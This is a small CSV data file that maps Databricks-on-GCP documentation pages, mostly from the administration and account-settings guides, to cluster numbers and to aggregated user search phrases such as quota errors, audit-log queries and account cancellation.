cluster,url,search_text
2,https://docs.gcp.databricks.com/,delta lake and delta engine guide streaming iot core to cloud storage
0,https://docs.gcp.databricks.com/_static/notebooks/mlflow/mlflow-end-to-end-example.html,10.5 ml
0,https://docs.gcp.databricks.com/administration-guide/access-control/cluster-acl.html,no active google kubernetes engine cluster found for workspace
0,https://docs.gcp.databricks.com/administration-guide/access-control/table-acl.html,premium dlt
3,https://docs.gcp.databricks.com/administration-guide/access-control/tokens.html,token management personal access token personal access create token how do
0,https://docs.gcp.databricks.com/administration-guide/account-settings-gcp/account-console.html,account console account console account console account console account console
0,https://docs.gcp.databricks.com/administration-guide/account-settings-gcp/account.html,"cancel free trail on google cloud platform cancel subscription domain restricted move to another subscription domain restricted sharing billing administrator bring your own vpc delete account ""order id"""
0,https://docs.gcp.databricks.com/administration-guide/account-settings-gcp/admin-users.html,delegated authentication accounts api
0,https://docs.gcp.databricks.com/administration-guide/account-settings-gcp/audit-logs.html,audit log audit logs audit logs audit log audit logs audit log audit log audit logs service account cluster audit logs diagnostic log
0,https://docs.gcp.databricks.com/administration-guide/account-settings-gcp/index.html,account console manage account cancel subscription delete account create workspace delete account account console account api create workspace create workspace account owner account management
0,https://docs.gcp.databricks.com/administration-guide/account-settings-gcp/log-delivery.html,log delivery audit logging audit logs audit logs audit log configuration audit log audit log audit log configure audit logg user log audit logs audit logs audit logs configure audit log audit log audit logging log delivery audit log audit log audit log delivery about audit log specifications audit logs audit logs audit logs usage log audit log
0,https://docs.gcp.databricks.com/administration-guide/account-settings-gcp/quotas.html,"required minimum quotas quota name no active google kubernetes engine cluster found for workspace change gcp project disk quota gcp error message: compute quota exceeded for in region us-east1: quota: ssd_total_gb, used 0.0 and requested 1000.0 out of 500.0 family cores quota cpu core quota gcp quota compute quota compute quota exceeded for expanded-dry ad-347202 in region asia-southeast1: quota: ssd_total_gb, used 0.0 and requested 1500.0 out of 500.0 ""compute engine"" quota limits"
0,https://docs.gcp.databricks.com/administration-guide/account-settings-gcp/usage-detail-tags-gcp.html,cluster tags monitoring usage view usage usage reports cluster tags cluster tags dbu usage cluster tags
0,https://docs.gcp.databricks.com/administration-guide/account-settings-gcp/usage.html,billable usage billable usage billable usage usage reports analyze billable usage log data view usage billable usage billable usage cluster billing billing usage delivery billable usage billable usage
0,https://docs.gcp.databricks.com/administration-guide/account-settings-gcp/workspaces.html,bind service accounts to a cluster. service account cluster service account azure customer managed vpc machine type dbr 8.4 delete workspace service account create workspaces create workspace google cloud charges you an additional per-workspace cost for the gke cluster service peering cidr create workspace gke cluster vpc peering workspace creation create a workspace create and manage workspaces using the account console
0,https://docs.gcp.databricks.com/administration-guide/account-settings/workload-types.html,jobs compute
0,https://docs.gcp.databricks.com/administration-guide/admin-console.html,lost admin password
